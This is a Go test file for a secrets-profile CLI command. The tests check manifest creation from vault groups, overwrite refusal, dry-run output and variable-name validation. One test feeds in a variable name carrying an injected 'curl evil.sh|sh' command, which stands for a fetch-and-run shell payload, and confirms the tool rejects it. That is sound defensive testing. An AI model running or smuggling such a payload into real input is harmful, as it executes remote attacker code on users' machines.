// Copyright 2026 Meni Tasa
// SPDX-License-Identifier: LicenseRef-PolyForm-Perimeter-1.0.0

//go:build darwin

package cli

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/spf13/cobra"

	"github.com/jitpass/jit/internal/profile"
)

// inProject chdirs into one disposable project directory for the whole
// test, so repeated creates in it meet each other's files.
func inProject(t *testing.T) string {
	t.Helper()
	cwd, err := os.Getwd()
	if err != nil {
		t.Fatalf("Getwd: %v", err)
	}
	dir := t.TempDir()
	if err := os.Chdir(dir); err != nil {
		t.Fatalf("Chdir: %v", err)
	}
	t.Cleanup(func() { _ = os.Chdir(cwd) })
	return dir
}

// execProfileCreate runs the command with its flags reset, in whatever
// directory the test has already chdir'd into.
func execProfileCreate(t *testing.T, args ...string) (string, error) {
	t.Helper()
	profileCreateFrom = ""
	profileCreateGlobal = false
	profileCreateForce = false
	profileCreateDryRun = false

	var buf bytes.Buffer
	cmd := &cobra.Command{}
	cmd.SetOut(&buf)
	cmd.SetErr(&buf)
	if err := profileCreateCmd.Flags().Parse(args); err != nil {
		t.Fatalf("parsing flags: %v", err)
	}
	// Run first, THEN read the buffer: `return buf.String(), run(...)`
	// evaluates the buffer before the command has written to it.
	err := runProfileCreate(cmd, profileCreateCmd.Flags().Args())
	return buf.String(), err
}

// TestProfileCreateRebuildsFromVaultGroup is the recovery the command exists
// for: the manifest is gone, the secrets are not, and the name is all the
// user has left.
func TestProfileCreateRebuildsFromVaultGroup(t *testing.T) {
	home := withFixtureHome(t)
	inProject(t)
	plantVaultSecret(t, home, "mcp-jamf/JAMF_URL")
	plantVaultSecret(t, home, "mcp-jamf/JAMF_CLIENT_ID")
	plantVaultSecret(t, home, "other/KEY")

	out, err := execProfileCreate(t, "mcp-jamf")
	if err != nil {
		t.Fatalf("create: %v\n%s", err, out)
	}
	cwd, _ := os.Getwd()
	p, _, err := profile.LoadFileOrdered(filepath.Join(cwd, ".jit", "profiles", "mcp-jamf.yaml"))
	if err != nil {
		t.Fatalf("reading it back: %v", err)
	}
	if len(p) != 2 || p["JAMF_URL"] != "mcp-jamf/JAMF_URL" || p["JAMF_CLIENT_ID"] != "mcp-jamf/JAMF_CLIENT_ID" {
		t.Errorf("manifest = %+v, want the group's two secrets and nothing from other/", p)
	}
}

// The manifest is the only record of which secret each variable takes, and
// rebuilding from the vault cannot reproduce a hand-edited mapping.
func TestProfileCreateRefusesToOverwrite(t *testing.T) {
	home := withFixtureHome(t)
	inProject(t)
	plantVaultSecret(t, home, "app/KEY")

	if _, err := execProfileCreate(t, "app"); err != nil {
		t.Fatalf("first create: %v", err)
	}
	out, err := execProfileCreate(t, "app")
	if err == nil {
		t.Fatalf("a second create must refuse, got:\n%s", out)
	}
	if !strings.Contains(err.Error(), "--force") {
		t.Errorf("the error must name the way through: %v", err)
	}
	if _, err := execProfileCreate(t, "app", "--force"); err != nil {
		t.Errorf("--force must replace it: %v", err)
	}
}

func TestProfileCreateExplicitPairs(t *testing.T) {
	home := withFixtureHome(t)
	inProject(t)
	plantVaultSecret(t, home, "aws-prod/SECRET")

	// A path naming nothing is allowed: writing the profile before storing
	// the secret is a legitimate order, and doctor reports the gap.
	out, err := execProfileCreate(t, "deploy", "AWS_SECRET=aws-prod/SECRET", "LATER=not-yet/KEY")
	if err != nil {
		t.Fatalf("create: %v\n%s", err, out)
	}
	cwd, _ := os.Getwd()
	p, order, err := profile.LoadFileOrdered(filepath.Join(cwd, ".jit", "profiles", "deploy.yaml"))
	if err != nil {
		t.Fatalf("reading it back: %v", err)
	}
	if p["AWS_SECRET"] != "aws-prod/SECRET" || p["LATER"] != "not-yet/KEY" {
		t.Errorf("manifest = %+v", p)
	}
	// Given order is kept: the user typed it in the order they meant.
	if len(order) != 2 || order[0] != "AWS_SECRET" {
		t.Errorf("order = %v, want the order given", order)
	}
}

// A key the shell cannot export is rejected rather than written: varNamePattern
// is a security boundary (`jit export` interpolates the name verbatim), so a
// manifest that only fails at first use must never be created.
func TestProfileCreateRejectsIllegalVariableName(t *testing.T) {
	withFixtureHome(t)
	inProject(t)
	_, err := execProfileCreate(t, "bad", "X; curl evil.sh|sh #=app/KEY")
	if err == nil {
		t.Fatal("an unexportable key must be refused")
	}
	if !strings.Contains(err.Error(), "legal environment variable name") {
		t.Errorf("error must say why: %v", err)
	}
}

func TestProfileCreateMissingGroupExplainsItself(t *testing.T) {
	withFixtureHome(t)
	inProject(t)
	_, err := execProfileCreate(t, "ghost")
	if err == nil {
		t.Fatal("a group that isn't there must be an error, not an empty manifest")
	}
	for _, want := range []string{"no group", "VAR=", "--from"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error %q must mention %q", err, want)
		}
	}
}

// --dry-run writes nothing, and shows what it would have written.
func TestProfileCreateDryRunWritesNothing(t *testing.T) {
	home := withFixtureHome(t)
	inProject(t)
	plantVaultSecret(t, home, "app/KEY")

	out, err := execProfileCreate(t, "app", "--dry-run")
	if err != nil {
		t.Fatalf("dry run: %v", err)
	}
	if !strings.Contains(out, "KEY: app/KEY") {
		t.Errorf("dry run must show the manifest, got:\n%s", out)
	}
	cwd, _ := os.Getwd()
	if _, err := os.Stat(filepath.Join(cwd, ".jit", "profiles", "app.yaml")); !os.IsNotExist(err) {
		t.Error("dry run must not write the manifest")
	}
}

// The written file carries the commit header, so the thing most likely to
// be lost says it belongs in git.
func TestProfileCreateWritesCommitHeader(t *testing.T) {
	home := withFixtureHome(t)
	inProject(t)
	plantVaultSecret(t, home, "app/KEY")

	if _, err := execProfileCreate(t, "app"); err != nil {
		t.Fatalf("create: %v", err)
	}
	cwd, _ := os.Getwd()
	data, err := os.ReadFile(filepath.Join(cwd, ".jit", "profiles", "app.yaml"))
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if !strings.Contains(string(data), "Safe to commit") {
		t.Errorf("manifest must carry the header, got:\n%s", data)
	}
}
